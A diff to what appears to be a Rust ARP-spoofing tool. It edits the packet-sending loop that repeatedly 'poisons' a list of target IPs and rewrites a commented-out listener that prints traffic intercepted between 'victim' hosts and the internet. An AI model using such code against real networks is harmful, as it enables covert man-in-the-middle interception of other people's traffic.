@@ -146,16 +146,14 @@ fn send_l2_packets() {
             promiscuous: false,
             socket_fd: None,
         };
-
-        let selves = &*SELF_INFO;
         let nf = &*NETWORK_INTERFACE;
         let args = &*ARGS;
 
         // use `mut rx` instead of `_rx` if you want listen datalink too
         // need to import `Packet` from `pnet::packet` and also need to import `Ipv4Packet` from `pnet::packet::ipv4`
 
-        // uncomment this code ↓
-        // use pnet::packet::{Packet, ipv4::Ipv4Packet};
+        // use pnet::packet::{Packet, ipv4::Ipv4Packet}; // uncomment this code if you want listen too
+        // let selves = &*SELF_INFO; // uncomment this code if you want listen too
         let (mut tx, _rx) = match datalink::channel(nf, config) {
             Ok(datalink::Channel::Ethernet(tx, rx)) => (tx, rx),
             Ok(_) => panic!("Unhandled channel type"),
@@ -168,7 +166,7 @@ fn send_l2_packets() {
         let mut last_poison = Instant::now();
         let poison_interval = Duration::from_millis(args.sleep);
 
-        let all_ips = ALL_IPS.get().filter(|x| !x.contains(&selves.0)).unwrap();
+        let all_ips = ALL_IPS.get().unwrap();
 
         loop {
             if last_poison.elapsed() >= poison_interval || args.no_sleep {
@@ -182,17 +180,34 @@ fn send_l2_packets() {
             // to check if this spoofing is work or not
             // match rx.next() {
             //     Ok(packet) => {
-            //         if let Some(ethernet) = EthernetPacket::new(packet) {
-            //             // Only care about IPv4 traffic
-            //             if ethernet.get_ethertype() == EtherTypes::Ipv4
-            //                 && let Some(ipv4) = Ipv4Packet::new(ethernet.payload())
+            //         if let Some(eth) = EthernetPacket::new(packet) {
+            //             let dst_mac = eth.get_destination();
+
+            //             if eth.get_ethertype() == EtherTypes::Ipv4
+            //                 && let Some(ipv4) = Ipv4Packet::new(eth.payload())
             //             {
-            //                 let src = ipv4.get_source();
-            //                 let dst = ipv4.get_destination();
-            //                 if all_ips.contains(&src) && dst == selves.0
-            //                     || all_ips.contains(&dst) && src == selves.0
+            //                 let src_ip = ipv4.get_source();
+            //                 let dst_ip = ipv4.get_destination();
+
+            //                 // Victim -> internet, sent to MY mac (intercepted outbound)
+            //                 if dst_mac == selves.1
+            //                     && all_ips.contains(&src_ip)
+            //                     && !all_ips.contains(&dst_ip)
             //                 {
-            //                     println!("Caught traffic: {} -> {}", src, dst);
+            //                     println!(
+            //                         "\nINTERCEPTED OUT: {} -> {}  (dst_mac={})",
+            //                         src_ip, dst_ip, dst_mac
+            //                     );
+            //                 }
+            //                 // Internet -> victim, sent to MY mac (intercepted inbound)
+            //                 if dst_mac == selves.1
+            //                     && all_ips.contains(&dst_ip)
+            //                     && !all_ips.contains(&src_ip)
+            //                 {
+            //                     println!(
+            //                         "\nINTERCEPTED IN : {} -> {}  (dst_mac={})",
+            //                         src_ip, dst_ip, dst_mac
+            //                     );
             //                 }
             //             }
             //         }
